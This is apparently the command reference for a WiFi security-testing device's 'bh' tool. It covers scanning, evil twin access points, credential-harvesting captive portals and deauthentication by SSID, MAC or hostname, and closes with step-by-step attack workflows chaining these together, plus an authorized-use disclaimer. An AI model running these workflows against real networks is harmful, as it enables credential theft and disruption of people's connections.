# BlackHat Board - Complete Functionality Reference

The BlackHat Board provides a comprehensive suite of WiFi security testing and network analysis tools through the `bh` command-line interface.

## WiFi Core Operations

### Network Scanning
```bash
bh wifi list <iface>        # Scan and list available WiFi networks
```
Lists all visible WiFi access points using the specified wireless interface.

### Interface Management
```bash
bh wifi dev                 # Enumerate wireless interfaces and capabilities
```
Shows available wireless interfaces with their frequency bands (2.4GHz, 5GHz support).

### Network Connection
```bash
bh wifi con <iface>         # Connect to configured network
bh wifi con stop            # Disconnect from network
```
Connect to or disconnect from WiFi networks using stored credentials.

### Access Point Creation
```bash
bh wifi ap <iface>          # Create access point
bh wifi ap stop             # Stop access point
```
Create a fake access point for testing or attack scenarios.

### IP Address Information
```bash
bh wifi ip                  # Display IP addresses of wireless interfaces
```

## Attack Vectors

### Evil Twin Attack
```bash
bh evil_twin                # Enable internet passthrough for MITM positioning
```
Creates a malicious access point that mirrors a legitimate network, allowing man-in-the-middle attacks while providing internet connectivity to maintain victim connections.

### Evil Portal (Captive Portal)
```bash
bh evil_portal              # Start captive portal for credential harvesting
bh evil_portal stop         # Stop captive portal
```
Deploys a captive portal that intercepts and captures user credentials. The portal can use custom HTML pages:
- `index.html` - Primary portal page
- `index2.html` - Secondary portal page  
- `index3.html` - Tertiary portal page

### Deauthentication Attacks
```bash
bh deauth <target>              # Disconnect clients from networks
```

**Target Types:**
- **SSID Name**: Disconnects all clients from specified network (must be connected to that network)
  ```bash
  bh deauth "HomeWiFi_5G"       # Disconnect all clients from HomeWiFi_5G
  ```
- **MAC Address**: Disconnects specific device by MAC address
  ```bash
  bh deauth aa:bb:cc:dd:ee:ff   # Disconnect specific device
  ```
- **Hostname**: Disconnects device by hostname (must be on same network as BlackHat board)
  ```bash
  bh deauth laptop-john         # Disconnect John's laptop
  ```

**Technical Details:**
- Automatically uses appropriate interface (prefers 5GHz USB dongle for monitor mode)
- Sends configurable number of deauth frames (default: 10)
- Supports both 2.4GHz and 5GHz networks
- Can target specific clients or entire networks

**Limitations:**
- Hostname resolution only works for devices on the same network you're connected to
- For external networks, must use MAC addresses obtained from scanning
- Some modern devices may reconnect quickly after deauth

## Monitoring & Intelligence

### Packet Capture
```bash
bh kismet <iface>           # Start Kismet packet capture and analysis
bh kismet stop              # Stop Kismet
```
Launches Kismet for comprehensive wireless packet capture, analysis, and monitoring. Accessible via web interface on port 2501.

### Network Connectivity Testing
```bash
bh test_inet                # Test internet connectivity (ping google.com)
```

## Configuration Management

### Network Credentials
```bash
bh set SSID "network_name"     # Set target network SSID
bh set PASS "password"         # Set network password
bh set AP_SSID "fake_ap_name"  # Set your fake access point name
```

### View Configuration
```bash
bh get                      # Display all current configuration settings
```

## System Management

### SSH Access
```bash
bh ssh                      # Start SSH daemon for remote access
bh ssh stop                 # Stop SSH daemon
```
Enables remote access to the BlackHat Board via SSH.

## Automation Framework

### Script Management
```bash
bh script scan              # List available automation scripts
bh script run <script>      # Execute custom automation script
```

## Typical Attack Workflows

### 1. Reconnaissance
```bash
# Identify wireless interfaces
bh wifi dev

# Scan for target networks
bh wifi list wlan0

# Monitor traffic
bh kismet wlan1
```

### 2. Evil Twin Setup
```bash
# Configure target network
bh set SSID "TargetNetwork"
bh set PASS "password123"

# Configure fake AP
bh set AP_SSID "TargetNetwork"

# Launch evil twin attack
bh evil_twin
```

### 3. Deauthentication Attacks
```bash
# Disconnect all clients from target network (if connected)
bh deauth "TargetNetwork"

# Disconnect specific device
bh deauth aa:bb:cc:dd:ee:ff

# Disconnect device by hostname (same network)
bh deauth laptop-victim
```

### 4. Credential Harvesting
```bash
# Deploy captive portal
bh evil_portal

# Monitor captured credentials in logs
```

### 5. Advanced Attack Scenarios
```bash
# Deauth + Evil Twin combination
bh deauth "LegitNetwork"        # Force disconnect clients
bh set AP_SSID "LegitNetwork"   # Create fake AP with same name
bh evil_portal                  # Capture credentials when clients reconnect

# Targeted deauth for specific user
bh deauth john-laptop           # Disconnect specific user
bh kismet wlan1                 # Monitor for reconnection attempts
```

## Security Considerations

This tool is designed for authorized security testing and educational purposes only. Users must:
- Obtain proper authorization before testing
- Comply with local laws and regulations
- Use only on networks you own or have explicit permission to test
- Understand the legal implications of wireless security testing

## Configuration Files

- Primary config: `blackhat.conf`
- Logs: `blackhat.log`
- Portal pages: `/var/www/`
- Network configs: `/etc/hostapd.conf`, `/etc/dnsmasq.conf`